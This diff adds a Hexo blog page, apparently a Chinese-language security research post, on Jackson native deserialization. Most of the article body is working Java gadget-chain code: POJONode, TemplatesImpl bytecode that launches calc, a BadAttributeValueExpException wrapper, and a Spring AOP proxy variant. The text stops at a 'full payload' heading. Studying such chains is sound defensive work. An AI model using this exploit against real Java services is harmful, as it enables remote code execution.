@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Jackson原生反序列化简单的反序列化demo123456789101112131415&lt;dependency&gt;  &lt;groupId&gt;com.fasterxml.jackson.core&lt;&#x2F;groupId&gt;  &lt;artifactId&gt;jackson-databind&lt;&#x2F;artifactId&gt;  &lt;version&gt;2.10.0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jackson反序列化">
+<meta property="og:url" content="https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="le0n&#39;s blogs">
+<meta property="og:description" content="Jackson原生反序列化简单的反序列化demo123456789101112131415&lt;dependency&gt;  &lt;groupId&gt;com.fasterxml.jackson.core&lt;&#x2F;groupId&gt;  &lt;artifactId&gt;jackson-databind&lt;&#x2F;artifactId&gt;  &lt;version&gt;2.10.0">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0wlle0n.github.io/images/ce011a39b5802583c4be537363c60a0f.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/3015d30f7234c008613444f48cfd0e25.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/a78b92a8644a802b268e6f3bb67d9705.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/22d5722a9ffc0af5b884f57c2a05e250.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/c3911891d4f42631344c2b4ff784f6d6.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/4f2b20e425e73bb34ea46df78f67da84.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/bb9307ed8ff92de1ade66c9a7f1418eb.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/7fe272d09d13b60c0ea08853da3b710a.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/0b7f412d66161734df52ed551fe671de.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/e53cc314aff0aabf673bc9ab72df526a.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/ef11eb781f77ec3e30b8282e07db5bf6.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/fab431b1a4231e30d8f299b958ee1501.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/bc26fedc1b53d74e79e7f3606e59e928.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/4e7c60072b6fe3c8fa3f5d15e411a561.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/8323b9e04453156a08f01de934bbf393.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/6c4da4a7ab7d156b1d12ba60ba466f6b.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/987327f57b3d036763fa7fc4fd027856.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/d208b5429dc79fcd53681a6203bc8558.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/f4f3c11fa6e43ab22204eea656dca2d8.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/2d979944987bf1e177b113512e21a39a.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/ed846361f35d74966ee674dbbe703cc9.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/2f2e54ebdd7c382715ae95739a5ecbd3.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/f08d1555195ae3abab2b1b0a780d805d.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/94cddab5d1492808c5c800f44eedd553.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/097a99534b9427994d39a933470d25c4.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/16ea5bddfd99e7014b598d89be23b73b.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/652ed2ad81befb0fbb40bdfd2db14611.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/3087162cf73293f4fa54284d63a0e9ac.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/d70c3dbd8ea3402358724ed6724a4e46.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/9267be44821aeefe260a0a755a868266.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/248249b7fd805ff26379c09c5e731fb4.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/3604a525b3772f37d272cbeab1f283aa.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/299a10e79d1cb59252a3222ee7de613a.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/b1492004fc7542c11cd7fa4d280fbee6.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/d07a54c67b2f6f5dd1d452d4a9b370dd.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/29ab6a0cdbfe85e1887cc0c9d289f13d.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/3604a525b3772f37d272cbeab1f283aa.png">
+<meta property="article:published_time" content="2025-04-02T08:31:47.000Z">
+<meta property="article:modified_time" content="2025-04-02T08:43:30.595Z">
+<meta property="article:author" content="le0n">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="Jackson反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0wlle0n.github.io/images/ce011a39b5802583c4be537363c60a0f.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Jackson反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y7V18M7XFP"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Y7V18M7XFP');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/31/%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E4%B8%8E%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9B%AE%E5%BD%95%E7%9A%84%E6%B7%B7%E6%B7%86%E9%97%AE%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Jackson反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Jackson反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Jackson反序列化&body=Check out this article: https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Jackson反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Jackson反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/04/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Jackson反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Jackson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96demo"><span class="toc-number">1.1.</span> <span class="toc-text">简单的反序列化demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-SpringBoot-%E7%8E%AF%E5%A2%83%E7%A8%B3%E5%AE%9A%E8%A7%A6%E5%8F%91-getOutputProperties-%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">在 SpringBoot 环境稳定触发 getOutputProperties 的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">调试过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjava%E4%BD%BF%E7%94%A8EventListenerList%E8%A7%A6%E5%8F%91toString"><span class="toc-number">1.3.</span> <span class="toc-text">高版本java使用EventListenerList触发toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">调试过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjava%E4%BD%BF%E7%94%A8TextAndMnemonicHashMap%E8%A7%A6%E5%8F%91toString"><span class="toc-number">1.4.</span> <span class="toc-text">高版本java使用TextAndMnemonicHashMap触发toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">调试过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">Jackson反序列化漏洞</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Jackson反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">le0n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-02T08:31:47.000Z" class="dt-published" itemprop="datePublished">2025-04-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Jackson反序列化</a>, <a class="p-category" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Jackson原生反序列化"><a href="#Jackson原生反序列化" class="headerlink" title="Jackson原生反序列化"></a>Jackson原生反序列化</h2><h3 id="简单的反序列化demo"><a href="#简单的反序列化demo" class="headerlink" title="简单的反序列化demo"></a>简单的反序列化demo</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jackson1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtobject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// step 1 删除writeReplace方法</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="comment">// step 2 将恶意类传入node</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(rtEvilObj());</span><br><span class="line">        <span class="comment">//        node.toString();</span></span><br><span class="line">        <span class="comment">// step 3 包装入反序列化toString调用器</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(val, <span class="string">&quot;val&quot;</span>, node);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Code</span> <span class="operator">=</span><span class="string">&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(base64Code);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(Output.serialize(rtobject()).toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="在-SpringBoot-环境稳定触发-getOutputProperties-的方法"><a href="#在-SpringBoot-环境稳定触发-getOutputProperties-的方法" class="headerlink" title="在 SpringBoot 环境稳定触发 getOutputProperties 的方法"></a>在 SpringBoot 环境稳定触发 <code>getOutputProperties</code> 的方法</h3><p>由于<code>POJONode</code> 的toString会调用<code>TemplatesImpl</code> 的所有getter方法，有时候容易卡在某个getter，使得利用十分不稳定，于是使用代理来限制只访问到<code>getOutputProperties</code>一个getter。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeTemplatesImplAopProxy</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(rtEvilObj());</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>advisedSupport</code> 成员是一个 <code>org.springframework.aop.framework.AdvisedSupport</code> 类型的对象，可以设置代理目标为恶意TemplatesImpl对象，然后再传入InvocationHandler中。</p>
+<p>当我们使用反射获取一个代理类上的所有方法时，只能获取到其代理的接口方法。</p>
+<p><img src="/images/ce011a39b5802583c4be537363c60a0f.png"></p>
+<p>所以这里<code>Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Templates.class&#125;, handler);</code>只能获取到<code>TemplatesImpl</code>的<code>getOutputProperties</code>方法，正好。</p>
+<p>完整pyload：</p>
